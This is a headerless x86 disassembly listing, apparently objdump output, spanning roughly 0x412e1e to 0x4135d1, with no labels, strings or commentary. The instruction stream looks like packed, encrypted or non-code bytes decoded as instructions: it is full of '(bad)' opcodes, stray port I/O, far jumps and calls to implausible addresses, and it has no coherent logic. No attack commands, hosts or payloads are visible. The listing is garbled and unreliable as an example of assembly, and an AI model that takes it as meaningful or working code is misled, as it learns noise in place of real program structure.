  412e1e:	icebp  
  412e1f:	add    esi,DWORD PTR [ebx+0x8]
  412e22:	out    dx,eax
  412e23:	inc    ebx
  412e24:	cld    
  412e25:	aas    
  412e26:	cmp    al,0x57
  412e28:	xchg   edi,eax
  412e29:	add    eax,0x106b5748
  412e2e:	jae    0x412e7e
  412e30:	and    DWORD PTR [ecx-0x45142ba8],edi
  412e36:	in     al,0x5d
  412e38:	mov    al,0xf
  412e3a:	xchg   ecx,eax
  412e3b:	(bad)  
  412e3d:	adc    dl,BYTE PTR [ebp-0x5bb2df5b]
  412e43:	pop    ebx
  412e44:	mov    ds:0xeef992a7,al
  412e4a:	fstp   DWORD PTR [ebx+ebp*1-0x7ccae295]
  412e51:	push   ebx
  412e52:	shl    DWORD PTR [esp+ebx*4-0x4f],0xe0
  412e57:	pop    edi
  412e58:	add    al,0x3d
  412e5a:	xor    al,0x5a
  412e5c:	lods   eax,DWORD PTR ds:[esi]
  412e5d:	loope  0x412e47
  412e5f:	xchg   ebp,eax
  412e60:	leave  
  412e61:	clc    
  412e62:	push   0xffffff93
  412e64:	lea    esi,[ebx-0x9]
  412e67:	shl    al,cl
  412e69:	cmp    DWORD PTR [ebx+0x1b0423e7],ebp
  412e6f:	pop    edx
  412e70:	push   ebx
  412e71:	sub    BYTE PTR [ebx],0x98
  412e74:	enter  0xf50a,0x5b
  412e78:	fs mov edi,0x32ec264a
  412e7e:	or     DWORD PTR [edi+0x57],ebp
  412e81:	test   BYTE PTR [edx],dh
  412e83:	jle    0x412e5f
  412e85:	mov    bl,0x8d
  412e87:	jp     0x412e8f
  412e89:	sub    DWORD PTR [esi+0x51],0x1a
  412e8d:	js     0x412eaa
  412e8f:	xor    ebp,DWORD PTR [esi+0x77]
  412e92:	(bad)  
  412e93:	imul   edx,esp,0x8d37fc6b
  412e99:	inc    edi
  412e9a:	adc    al,0x4c
  412e9c:	push   esi
  412e9d:	xor    al,0x2
  412e9f:	mov    ch,0xa5
  412ea1:	dec    esi
  412ea2:	jae    0x412e35
  412ea4:	vpsrad xmm7,xmm6,XMMWORD PTR [ebx+ecx*2]
  412ea9:	loope  0x412ecd
  412eab:	stos   DWORD PTR es:[edi],eax
  412eac:	cmp    DWORD PTR [ebx+0x5681d94],edi
  412eb2:	popf   
  412eb3:	lock cmc 
  412eb5:	ret    
  412eb6:	jo     0x412e78
  412eb8:	jg     0x412f2b
  412eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ebb:	in     eax,dx
  412ebc:	in     al,dx
  412ebd:	imul   ebp,edi,0x58
  412ec0:	mov    ebx,0x3ab99e33
  412ec5:	sub    al,0x41
  412ec7:	or     ecx,DWORD PTR [ebx-0x60]
  412eca:	shr    ebp,1
  412ecc:	cmp    al,0xe0
  412ece:	jge    0x412e59
  412ed0:	stos   BYTE PTR es:[edi],al
  412ed1:	sub    BYTE PTR [ecx+0x41],ch
  412ed4:	adc    al,0x31
  412ed6:	or     al,0xe2
  412ed8:	fst    QWORD PTR [edi+0x58]
  412edb:	mov    edx,0xf5972e1b
  412ee0:	sbb    bh,BYTE PTR [edi-0x7608e4e2]
  412ee6:	push   eax
  412ee7:	test   eax,0x63ddcd9a
  412eec:	cli    
  412eed:	jae    0x412f28
  412eef:	leave  
  412ef0:	sbb    DWORD PTR [esi],esp
  412ef2:	push   ecx
  412ef3:	outs   dx,BYTE PTR ds:[esi]
  412ef4:	push   edi
  412ef5:	or     al,0xe1
  412ef7:	ins    BYTE PTR es:[edi],dx
  412ef8:	fcmovne st,st(0)
  412efa:	xchg   ebp,eax
  412efb:	dec    ecx
  412efc:	inc    ecx
  412efd:	mov    WORD PTR [ebx+edi*1-0x20083e1e],?
  412f04:	out    dx,eax
  412f05:	xor    al,0x2c
  412f07:	fs push es
  412f09:	xchg   edi,eax
  412f0a:	jo     0x412eb8
  412f0c:	pop    edx
  412f0d:	dec    esp
  412f0e:	mov    edi,0x33b68fad
  412f13:	(bad)  
  412f14:	sahf   
  412f15:	lods   eax,DWORD PTR ds:[esi]
  412f16:	push   ebx
  412f17:	xchg   edi,eax
  412f18:	sub    DWORD PTR [eax-0x70],ebp
  412f1b:	out    dx,eax
  412f1c:	adc    BYTE PTR [esi+0x21],dh
  412f1f:	in     eax,dx
  412f20:	call   0x769888ce
  412f25:	push   cs
  412f26:	and    edx,DWORD PTR [eax-0x7b55b5dd]
  412f2c:	jb     0x412f2c
  412f2e:	push   ebx
  412f2f:	jns    0x8ad3320c
  412f35:	pusha  
  412f36:	mov    esp,0xff985387
  412f3b:	sbb    DWORD PTR [ebx-0x35],edi
  412f3e:	mov    cl,0x45
  412f40:	(bad)  
  412f41:	cld    
  412f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f43:	ins    DWORD PTR es:[edi],dx
  412f44:	inc    ebp
  412f45:	in     al,0x35
  412f47:	inc    eax
  412f48:	pop    DWORD PTR [edx+eiz*8+0x4c77d051]
  412f4f:	call   DWORD PTR [ebp+0x4b]
  412f52:	mov    esi,0x18a873ed
  412f57:	push   0xffffffc4
  412f59:	dec    ecx
  412f5a:	pop    esp
  412f5b:	adc    al,BYTE PTR [edi+0x5fb05d5c]
  412f61:	cmp    DWORD PTR [ecx+0x16585791],esp
  412f67:	fisttp QWORD PTR [ebp+0x61f19eac]
  412f6d:	cmp    bh,al
  412f6f:	dec    edx
  412f70:	rcr    bl,1
  412f72:	lea    edi,[ebp+eiz*8-0x91cd475]
  412f79:	idiv   BYTE PTR [edx+ebp*1+0x20]
  412f7d:	out    dx,eax
  412f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f7f:	cmc    
  412f80:	in     eax,0xcc
  412f82:	mov    ecx,0x598ea99b
  412f87:	mov    ah,bl
  412f89:	mov    ds:0x82cc7a2f,al
  412f8e:	in     eax,0xdf
  412f90:	arpl   WORD PTR [edi+0x74],dx
  412f93:	cmp    DWORD PTR gs:[edx],0xffffff84
  412f97:	and    ah,BYTE PTR fs:[ecx*2+0x152a1092]
  412f9f:	fsub   DWORD PTR [ecx-0x19]
  412fa2:	data16 arpl WORD PTR [esi],dx
  412fa5:	jb     0x412f5b
  412fa7:	add    esp,DWORD PTR [eax-0x26]
  412faa:	pop    edx
  412fab:	(bad)  
  412fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fad:	cmp    ch,BYTE PTR [ecx+ebx*1]
  412fb0:	xor    BYTE PTR [esi+0x31b84b3d],dl
  412fb6:	in     eax,0xc7
  412fb8:	pop    edi
  412fb9:	jp     0x412fe4
  412fbb:	(bad)  
  412fbc:	pop    ebx
  412fbd:	ds (bad) 
  412fbf:	jecxz  0x412f96
  412fc1:	into   
  412fc2:	lds    edi,FWORD PTR [eax+ecx*4-0x25714160]
  412fc9:	ja     0x412faa
  412fcb:	lock fucomp st(2)
  412fce:	jbe    0x412fe2
  412fd0:	gs mov esp,0x58ba871e
  412fd6:	fs into 
  412fd8:	cmp    al,BYTE PTR [ecx+0x4846f6cc]
  412fde:	lock ret 
  412fe0:	std    
  412fe1:	xchg   edx,eax
  412fe2:	mov    bl,0xa5
  412fe4:	dec    edx
  412fe5:	or     BYTE PTR [ebx-0x71b602f9],cl
  412feb:	inc    ebx
  412fec:	inc    ebx
  412fed:	scas   al,BYTE PTR es:[edi]
  412fee:	inc    esp
  412fef:	xlat   BYTE PTR ds:[ebx]
  412ff0:	dec    ebx
  412ff1:	mov    ds:0x573d81de,eax
  412ff6:	or     BYTE PTR [ecx+0x49156c54],ch
  412ffc:	mov    ebp,0xbee797fa
  413001:	inc    esp
  413002:	cld    
  413003:	cdq    
  413004:	mov    ebp,0x46c8e763
  413009:	ret    
  41300a:	cmp    bl,BYTE PTR [eax-0x45]
  41300d:	xchg   ecx,eax
  41300e:	(bad)  
  41300f:	call   0x981db6f5
  413014:	pusha  
  413015:	fisubr DWORD PTR [esi]
  413017:	jl     0x41308f
  413019:	sub    cl,al
  41301b:	jmp    0x49f36412
  413020:	or     esi,esp
  413022:	icebp  
  413023:	mov    ebp,0xa0d6b55d
  413028:	cmp    eax,0x19793f43
  41302d:	mov    BYTE PTR [eax+ebp*4-0x5510b778],al
  413034:	js     0x41303d
  413036:	test   DWORD PTR [edx-0x4251b536],ebp
  41303c:	stc    
  41303d:	jmp    0x5d02345f
  413042:	mov    al,0xd8
  413044:	lods   eax,DWORD PTR ds:[esi]
  413045:	ja     0x41304a
  413047:	or     DWORD PTR [edx-0x1dac4fa1],0xa3a9ddb2
  413051:	and    BYTE PTR [edi+0x1f],ch
  413054:	daa    
  413055:	es mov edi,ss
  413058:	ret    
  413059:	pop    ecx
  41305a:	ret    0x4f2e
  41305d:	call   0x276:0x75286847
  413064:	push   ss
  413065:	stos   BYTE PTR es:[edi],al
  413066:	shl    DWORD PTR [ecx+edi*2],0x1b
  41306a:	sub    bl,dl
  41306c:	ret    
  41306d:	cwde   
  41306e:	test   ebp,ecx
  413070:	cmp    ebx,DWORD PTR [ecx-0x1d]
  413073:	aam    0x54
  413075:	gs push edi
  413077:	mov    esp,0xe9e4c47f
  41307c:	repnz add DWORD PTR [ebx-0x717d6316],ebx
  413083:	out    dx,eax
  413084:	and    eax,DWORD PTR [ebp+0x7e30aad3]
  41308a:	fwait
  41308b:	sbb    eax,0x9df0e241
  413090:	lods   al,BYTE PTR ds:[esi]
  413091:	popf   
  413092:	stc    
  413093:	lods   al,BYTE PTR ds:[esi]
  413094:	jge    0x413049
  413096:	gs push es
  413098:	sbb    ecx,DWORD PTR [esi]
  41309a:	cmp    DWORD PTR ds:0x9b7b5b13,edx
  4130a0:	imul   ebx,DWORD PTR [edx-0x77],0xc7715034
  4130a7:	lods   eax,DWORD PTR ds:[esi]
  4130a8:	das    
  4130a9:	cmc    
  4130aa:	cmp    edx,edx
  4130ac:	inc    esp
  4130ad:	xor    ah,BYTE PTR [ecx+0x78c93d97]
  4130b3:	jmp    0xdebd4040
  4130b8:	stos   DWORD PTR es:[edi],eax
  4130b9:	sbb    cl,BYTE PTR [edi]
  4130bb:	dec    ebx
  4130bc:	or     ah,BYTE PTR [ebx]
  4130be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130bf:	lds    ebx,FWORD PTR ds:[edi-0x4e0d3940]
  4130c6:	fsubr  DWORD PTR [ecx+0x7778e2bd]
  4130cc:	adc    al,0x43
  4130ce:	jl     0x413071
  4130d0:	stos   BYTE PTR es:[edi],al
  4130d1:	mov    eax,ds:0x9105a61a
  4130d6:	add    eax,0x12fd958c
  4130db:	xchg   ebx,eax
  4130dc:	test   cl,0x91
  4130df:	addr16 push ecx
  4130e1:	pop    ecx
  4130e2:	aaa    
  4130e3:	nop
  4130e4:	and    BYTE PTR [esi],dh
  4130e6:	jne    0x4130bb
  4130e8:	add    eax,0x27b60951
  4130ed:	outs   dx,DWORD PTR ds:[esi]
  4130ee:	push   edx
  4130ef:	inc    ebx
  4130f0:	cmp    ecx,DWORD PTR [eax+0x55bfdcba]
  4130f6:	pop    ds
  4130f7:	imul   esp,DWORD PTR [ecx+esi*4],0x429d605e
  4130fe:	shl    dl,cl
  413100:	xchg   esi,eax
  413101:	daa    
  413102:	scas   eax,DWORD PTR es:[edi]
  413103:	mov    eax,0x5efb52db
  413108:	mov    ah,0x93
  41310a:	shl    DWORD PTR ds:0x925f53cb,1
  413110:	pop    ss
  413111:	sbb    DWORD PTR [edx+eiz*2],edi
  413114:	mov    ds:0x4bdef18b,eax
  413119:	sbb    al,0x6c
  41311b:	test   BYTE PTR [edx-0x46],al
  41311e:	mov    ds:0xf2825322,al
  413123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413126:	cmc    
  413127:	adc    ebp,DWORD PTR [ebx+ebp*1-0x73]
  41312b:	sbb    bl,bl
  41312d:	out    dx,eax
  41312e:	ret    
  41312f:	mov    ecx,0xe0267556
  413134:	mov    ebp,ss
  413136:	loopne 0x413178
  413138:	es jmp 0x78e6:0x9289a576
  413140:	ss inc ecx
  413142:	mov    WORD PTR [ebx],es
  413144:	mov    fs,WORD PTR [eax-0x7d600a0]
  41314a:	cmp    cl,al
  41314c:	adc    al,0xc1
  41314e:	clc    
  41314f:	jae    0x413116
  413151:	(bad)  
  413153:	stos   BYTE PTR es:[edi],al
  413154:	(bad)  
  413155:	rol    DWORD PTR [esi+0x7aa305f2],1
  41315b:	imul   esi,DWORD PTR [ebx-0x27a38671],0x54
  413162:	nop
  413163:	and    esi,DWORD PTR [ecx+0x630a07b5]
  413169:	pop    edx
  41316a:	pop    edx
  41316b:	inc    edi
  41316c:	pop    edx
  41316d:	mov    ch,BYTE PTR [edi-0xd]
  413170:	sar    BYTE PTR ds:0x68f61331,0xdd
  413177:	out    0x96,al
  413179:	lods   eax,DWORD PTR ds:[esi]
  41317a:	sbb    eax,esp
  41317c:	push   es
  41317d:	aad    0x2f
  41317f:	mov    es:0x4d82bf7a,al
  413185:	or     al,0xca
  413187:	sahf   
  413188:	sar    dl,0xb1
  41318b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41318c:	mov    dl,0x10
  41318e:	jecxz  0x4131b3
  413190:	jo     0x4131a4
  413192:	sbb    bh,bl
  413194:	shr    DWORD PTR [esi+0x56],1
  413197:	mov    ecx,0xff1e3611
  41319c:	cmp    esp,DWORD PTR [ebx]
  41319e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41319f:	inc    eax
  4131a0:	xlat   BYTE PTR ds:[ebx]
  4131a1:	jecxz  0x413129
  4131a3:	ds or  bl,0x2b
  4131a7:	mov    ss,WORD PTR [eax]
  4131a9:	add    al,0xa8
  4131ab:	sti    
  4131ac:	repz or BYTE PTR [edx-0xd375436],0x51
  4131b4:	aas    
  4131b5:	repnz sub DWORD PTR [edx-0x5f6b7165],0x8f64408e
  4131c0:	mov    ah,0x93
  4131c2:	jl     0x413146
  4131c4:	mov    edx,?
  4131c6:	(bad)  
  4131c7:	jae    0x413177
  4131c9:	cmc    
  4131ca:	call   0xe04d:0xd41db1a2
  4131d1:	dec    ebx
  4131d2:	push   ebx
  4131d3:	das    
  4131d4:	push   0x18
  4131d6:	popa   
  4131d7:	cmp    al,0x70
  4131d9:	sahf   
  4131da:	jge    0x41320b
  4131dc:	rol    DWORD PTR [edi],1
  4131de:	mov    ds:0x3d013b1f,eax
  4131e3:	mov    bl,0x78
  4131e5:	loopne 0x413221
  4131e7:	call   0x323d75ca
  4131ec:	xlat   BYTE PTR ds:[ebx]
  4131ed:	xor    DWORD PTR [ebp-0x39],edx
  4131f0:	stc    
  4131f1:	push   cs
  4131f2:	cmp    edi,DWORD PTR [ecx+0x58]
  4131f5:	test   DWORD PTR [esi-0x162b9e47],esi
  4131fb:	add    eax,0x5e51c941
  413200:	into   
  413201:	fwait
  413202:	in     al,dx
  413203:	push   ds
  413204:	rcr    DWORD PTR ds:0xb7cd1b44,0x6c
  41320b:	pop    es
  41320c:	in     eax,0x8e
  41320e:	and    al,0xdc
  413210:	outs   dx,BYTE PTR ds:[esi]
  413211:	nop
  413212:	pusha  
  413213:	repnz inc ebx
  413215:	fst    QWORD PTR [edx+0x663c2af5]
  41321b:	out    dx,al
  41321c:	push   ds
  41321d:	mov    es,WORD PTR [esi-0x1ba9578f]
  413223:	ins    DWORD PTR es:[edi],dx
  413224:	push   ecx
  413225:	in     al,dx
  413226:	xchg   ebp,eax
  413227:	rol    BYTE PTR [esi+eax*2],cl
  41322a:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41322c:	jno    0x413258
  41322e:	mov    ah,0x9
  413230:	xchg   edx,eax
  413231:	add    DWORD PTR [ebp+0x5ca9cec6],eax
  413237:	shl    BYTE PTR [ebx],1
  413239:	jne    0x4131d4
  41323b:	push   0x67e7b5b5
  413240:	(bad)  
  413241:	(bad)  
  413242:	ss out 0x4,al
  413245:	xchg   esi,eax
  413246:	es inc ecx
  413248:	fiadd  DWORD PTR [ecx+0x908d8a3]
  41324e:	aam    0xc0
  413250:	stc    
  413251:	jne    0x41328c
  413253:	sub    edx,DWORD PTR [ebx+0x436b1d0c]
  413259:	jl     0x4131dc
  41325b:	mov    bl,0xe
  41325d:	lods   al,BYTE PTR ds:[esi]
  41325e:	adc    dl,BYTE PTR [edx+0x6422124b]
  413264:	call   0x40036b38
  413269:	leave  
  41326a:	aam    0xb
  41326c:	dec    esi
  41326d:	mov    ds,eax
  41326f:	mov    bl,0xa6
  413271:	mov    ch,0xdd
  413273:	mov    BYTE PTR [esi+0x2188d042],ch
  413279:	pusha  
  41327a:	dec    esi
  41327b:	repnz (bad) 
  41327d:	adc    al,0x41
  41327f:	mov    edx,0x6ddb2bf6
  413284:	xchg   DWORD PTR [eax-0x7],esi
  413287:	adc    eax,0x5683d7d9
  41328c:	ins    DWORD PTR es:[edi],dx
  41328d:	sub    bh,bl
  41328f:	jbe    0x413285
  413291:	or     al,0x60
  413293:	and    eax,0xe3058501
  413298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413299:	pushf  
  41329a:	add    al,0xe4
  41329c:	pop    esi
  41329d:	push   esi
  41329e:	sub    BYTE PTR [ecx+esi*4+0x35ca49c7],dh
  4132a5:	mov    gs,WORD PTR [ebp+0x55376bbf]
  4132ab:	out    dx,eax
  4132ac:	xchg   ebx,eax
  4132ad:	into   
  4132ae:	loopne 0x413239
  4132b0:	loop   0x413310
  4132b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132b3:	popa   
  4132b4:	dec    edi
  4132b5:	into   
  4132b6:	pop    es
  4132b7:	lea    ebx,[eax]
  4132b9:	add    cl,cl
  4132bb:	fs int3 
  4132bd:	cmp    al,0x7b
  4132bf:	or     eax,0x49b5335
  4132c4:	(bad)  
  4132c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132c6:	lods   eax,DWORD PTR ds:[esi]
  4132c7:	dec    esi
  4132c8:	in     eax,dx
  4132c9:	or     DWORD PTR [ecx+0x8],ecx
  4132cc:	cwde   
  4132cd:	mov    ds:0x5cb74632,eax
  4132d2:	mov    BYTE PTR ds:0xae37eb0c,cl
  4132d8:	in     al,0xd7
  4132da:	loop   0x41331a
  4132dc:	repz xchg edx,eax
  4132de:	ja     0x4132e4
  4132e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132e1:	fnstsw WORD PTR [edx-0x7f67889a]
  4132e7:	clc    
  4132e8:	mul    ebx
  4132ea:	dec    esi
  4132eb:	ror    BYTE PTR [ecx-0x28c9b859],1
  4132f1:	mov    ds:0x6ac2c650,eax
  4132f6:	es dec esi
  4132f8:	sub    al,0x2f
  4132fa:	lock fild DWORD PTR [ebp+0x3f]
  4132fe:	loopne 0x4132ab
  413300:	dec    eax
  413301:	shl    DWORD PTR [esi-0x7b],1
  413304:	js     0x4132b7
  413306:	arpl   bp,si
  413308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413309:	out    dx,al
  41330a:	sahf   
  41330b:	cmp    eax,0xabe36ab4
  413310:	add    ah,al
  413312:	push   ds
  413313:	in     al,0x62
  413315:	xor    eax,0xb36703ed
  41331a:	add    cl,ch
  41331c:	(bad)  
  41331e:	sbb    DWORD PTR [esi-0x36],ebx
  413321:	aam    0x60
  413323:	cld    
  413324:	push   edi
  413325:	lods   al,BYTE PTR ds:[esi]
  413326:	stos   DWORD PTR es:[edi],eax
  413327:	sbb    ecx,DWORD PTR [ebx-0x6598650f]
  41332d:	cmp    eax,0x64549ea2
  413332:	xchg   BYTE PTR [esi],ch
  413334:	sub    edi,edi
  413336:	lods   al,BYTE PTR fs:[esi]
  413338:	push   ss
  413339:	push   0x71e5757d
  41333e:	sbb    eax,0xa0534d1d
  413343:	jb     0x41337f
  413345:	ret    0xa918
  413348:	push   es
  413349:	ficom  DWORD PTR [ebx+ecx*8-0x267b689f]
  413350:	xchg   DWORD PTR [ebx-0x660a7a89],ebx
  413356:	jb     0x41330e
  413358:	scas   al,BYTE PTR es:[edi]
  413359:	mov    WORD PTR [edx-0x32fe48d5],ss
  41335f:	(bad)  
  413360:	inc    edi
  413361:	mov    edi,0xf857a7ca
  413366:	jnp    0x4133b6
  413368:	and    ebp,edi
  41336a:	jbe    0x41339c
  41336c:	xor    cl,BYTE PTR [eax]
  41336e:	shl    BYTE PTR [esi],0xf1
  413371:	cmc    
  413372:	jmp    0x7f003b90
  413377:	mov    ch,0x4b
  413379:	cli    
  41337a:	dec    ecx
  41337b:	(bad)
  41337f:	and    eax,0xfd9d83f0
  413384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413385:	push   edx
  413386:	ss xchg ebp,eax
  413388:	(bad)  
  413389:	aad    0xe
  41338b:	mov    ecx,0xd3e090f0
  413390:	jmp    0xf244:0x7cea11e
  413397:	shl    BYTE PTR [ebp-0x1c],cl
  41339a:	mov    eax,ds:0x26113e74
  41339f:	dec    ecx
  4133a0:	mov    ah,0xcd
  4133a2:	out    dx,eax
  4133a3:	aad    0xa7
  4133a5:	stos   DWORD PTR es:[edi],eax
  4133a6:	aaa    
  4133a7:	rol    BYTE PTR [eax-0x5cbbb105],0xcf
  4133ae:	sahf   
  4133af:	shr    DWORD PTR [ecx+ebp*4+0x44],1
  4133b3:	retf   0x23bc
  4133b6:	pop    ss
  4133b7:	cmp    BYTE PTR [edi],ah
  4133b9:	cmc    
  4133ba:	inc    DWORD PTR [esi+0x13ea83df]
  4133c0:	lock cmp ebx,0xffffffbb
  4133c4:	push   ds
  4133c5:	mov    dl,bl
  4133c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133c8:	push   ecx
  4133c9:	retf   
  4133ca:	or     al,0xf1
  4133cc:	repz mov ah,0x8b
  4133cf:	push   edx
  4133d0:	outs   dx,BYTE PTR ds:[esi]
  4133d1:	cmp    al,bh
  4133d3:	xchg   ebx,eax
  4133d4:	cs or  eax,0x8e4b1dea
  4133da:	pop    eax
  4133db:	sub    al,0x4e
  4133dd:	dec    esi
  4133de:	std    
  4133df:	(bad)  
  4133e1:	xchg   ebx,eax
  4133e2:	repz jmp 0xb456d0be
  4133e8:	xchg   ebx,eax
  4133e9:	inc    ebx
  4133ea:	sar    eax,cl
  4133ec:	push   edx
  4133ed:	sbb    al,0x1b
  4133ef:	or     ebx,DWORD PTR [esi-0x63eaba21]
  4133f5:	jmp    0x4133c7
  4133f7:	mov    bh,0x39
  4133f9:	imul   ecx,esp,0xfffffff8
  4133fc:	push   0xffffffc1
  4133fe:	mov    ds:0x18775a05,al
  413403:	(bad)  
  413404:	xchg   esi,eax
  413405:	mov    edi,DWORD PTR [ebp-0x283a64cc]
  41340b:	scas   eax,DWORD PTR es:[edi]
  41340c:	sar    ecx,0x55
  41340f:	cwde   
  413410:	stos   DWORD PTR es:[edi],eax
  413411:	call   0xaf5f5561
  413416:	xchg   sp,ax
  413418:	add    DWORD PTR [ebp-0x36d10b53],edi
  41341e:	in     eax,0xb0
  413420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413421:	push   0xffffffdf
  413423:	(bad)  
  413424:	mov    edx,DWORD PTR ds:0x1046a37
  41342a:	ins    BYTE PTR es:[edi],dx
  41342b:	xchg   BYTE PTR [esp+edi*2-0x481b1207],dh
  413432:	lahf   
  413433:	jge    0x4133d6
  413435:	test   al,0xda
  413437:	jle    0x41347a
  413439:	inc    ecx
  41343a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41343b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41343c:	pop    ecx
  41343d:	shl    BYTE PTR [eax-0x6ba6b6bc],0x86
  413444:	enter  0x88de,0x67
  413448:	mov    ecx,0x3acfc178
  41344d:	push   ecx
  41344e:	xchg   esi,eax
  41344f:	dec    ecx
  413450:	and    DWORD PTR [ecx+0x19478de2],0xa666d840
  41345a:	mov    esp,0xf12eeb1a
  41345f:	test   al,0x13
  413461:	arpl   sp,cx
  413463:	xchg   DWORD PTR [esi-0x1248e600],ebx
  413469:	push   edx
  41346a:	mov    edx,0xc263c405
  41346f:	xor    al,0xfc
  413471:	xor    BYTE PTR [ebx+edi*4-0x41],bh
  413475:	adc    DWORD PTR [esi+0x226f37a3],ecx
  41347b:	jns    0x413498
  41347d:	clc    
  41347e:	icebp  
  41347f:	push   es
  413480:	stc    
  413481:	sub    BYTE PTR [ebx+edi*8+0x2a],ch
  413485:	pop    ecx
  413486:	sub    eax,ecx
  413488:	std    
  413489:	sub    ah,dl
  41348b:	popf   
  41348c:	jnp    0x4134ff
  41348e:	jno    0x4134a7
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	(bad)  
  413492:	mov    ds:0x52eb72bd,eax
  413497:	aas    
  413498:	mov    bl,0xa
  41349a:	mov    esi,0x6323d439
  41349f:	inc    edi
  4134a0:	into   
  4134a1:	jb     0x4134d6
  4134a3:	jle    0x4134fc
  4134a5:	mov    eax,0xc76392da
  4134aa:	imul   ecx,DWORD PTR [edi+eiz*1+0xb],0xfffffff1
  4134af:	je     0x4134b2
  4134b1:	aad    0xcc
  4134b3:	aam    0xbd
  4134b5:	inc    ebp
  4134b6:	inc    edi
  4134b7:	cs jg  0x413499
  4134ba:	inc    esp
  4134bb:	cmp    eax,0xf4f60e5a
  4134c0:	fld    DWORD PTR [edx+0x0]
  4134c3:	popf   
  4134c4:	ds cmp eax,0xc0bfd85
  4134ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134cb:	in     eax,0xd3
  4134cd:	cmp    sp,WORD PTR [ebx+0x544c6e3e]
  4134d4:	pop    edx
  4134d5:	ret    0x101b
  4134d8:	add    eax,0xc0ab5303
  4134dd:	push   ds
  4134de:	or     ch,BYTE PTR [eax+0x47]
  4134e1:	cld    
  4134e2:	cmc    
  4134e3:	pop    ss
  4134e4:	js     0x4134c2
  4134e6:	add    bh,ah
  4134e8:	sub    ah,bh
  4134ea:	mov    al,0x29
  4134ec:	stos   BYTE PTR es:[edi],al
  4134ed:	dec    edx
  4134ee:	pop    esp
  4134ef:	xchg   esp,eax
  4134f0:	adc    al,0xf8
  4134f2:	jecxz  0x413487
  4134f4:	and    BYTE PTR [edx-0x2e],dl
  4134f7:	test   BYTE PTR [edi+ecx*8+0x32a98cf7],ch
  4134fe:	test   eax,0xffba54a5
  413503:	cmp    al,0x8e
  413505:	in     al,dx
  413506:	jle    0x413533
  413508:	jb     0x41352e
  41350a:	nop
  41350b:	jne    0x4134ea
  41350d:	pop    es
  41350e:	clc    
  41350f:	pop    esp
  413510:	retf   
  413511:	xor    BYTE PTR ds:0xe81ff91e,dl
  413517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413518:	std    
  413519:	ins    BYTE PTR es:[edi],dx
  41351a:	ds pop esp
  41351c:	inc    edi
  41351d:	data16 mov al,ds:0x28d7452
  413523:	mov    ds:0x56c27ce8,al
  413528:	push   esp
  413529:	pushf  
  41352a:	loop   0x4134fc
  41352c:	(bad)  
  41352d:	popf   
  41352e:	xchg   edx,eax
  41352f:	(bad)  
  413530:	sub    DWORD PTR [eax],ebx
  413532:	mov    eax,0x3ad91d2d
  413537:	sub    bh,BYTE PTR [ecx+0x192f3fb3]
  41353d:	in     al,dx
  41353e:	(bad)  
  41353f:	sbb    BYTE PTR [eax+0x5a8d3a17],dh
  413545:	xor    ah,BYTE PTR [eax+edi*1-0x66]
  413549:	xchg   ecx,eax
  41354a:	loopne 0x413588
  41354c:	push   esp
  41354d:	jne    0x4135b4
  41354f:	pop    ds
  413550:	sub    BYTE PTR [ecx],0xa6
  413553:	sub    dl,bh
  413555:	or     al,0xd4
  413557:	sbb    eax,0x3e3024ab
  41355c:	rcl    BYTE PTR [esi+0x69c543fe],cl
  413562:	int3   
  413563:	or     al,BYTE PTR [edx+ebp*8+0x4f]
  413567:	sbb    DWORD PTR [eax-0x6ff7b4a5],ebx
  41356d:	xor    esp,DWORD PTR [esi-0x8]
  413570:	push   edx
  413571:	(bad)  
  413573:	cmp    BYTE PTR [eax+0x3b],bh
  413576:	xchg   esi,eax
  413577:	sub    DWORD PTR [ecx+eax*4-0x6],edi
  41357b:	pop    ss
  41357c:	fiadd  WORD PTR [edx+0x37a03594]
  413582:	inc    esp
  413583:	adc    ch,BYTE PTR [ebx+0x39bb8559]
  413589:	xchg   esp,eax
  41358a:	pop    esp
  41358b:	inc    eax
  41358c:	ss inc edi
  41358e:	or     al,0x9c
  413590:	mov    ecx,0xd8f3ef0c
  413595:	mov    bl,bh
  413597:	inc    esi
  413598:	mov    bl,BYTE PTR [ebp+0x7a00a010]
  41359e:	sub    al,BYTE PTR [ecx]
  4135a0:	daa    
  4135a1:	sti    
  4135a2:	(bad)  [ecx]
  4135a4:	ja     0x413530
  4135a6:	les    ebp,FWORD PTR [esi]
  4135a8:	or     esi,edx
  4135aa:	push   ecx
  4135ab:	dec    edx
  4135ac:	push   esp
  4135ad:	dec    eax
  4135ae:	and    edx,ebp
  4135b0:	xchg   edi,eax
  4135b1:	inc    esi
  4135b2:	and    BYTE PTR [esp+eiz*8-0x25f5c50],0x9f
  4135ba:	mov    ecx,0xa1b32576
  4135bf:	push   ecx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	(bad)
  4135c5:	xchg   ecx,eax
  4135c6:	into   
  4135c7:	pop    esp
  4135c8:	out    dx,eax
  4135c9:	adc    edx,DWORD PTR [esp+eiz*8-0x3f]
  4135cd:	mov    dh,0x74
  4135cf:	mov    bl,0xf9
  4135d1:	loop   0x41360b
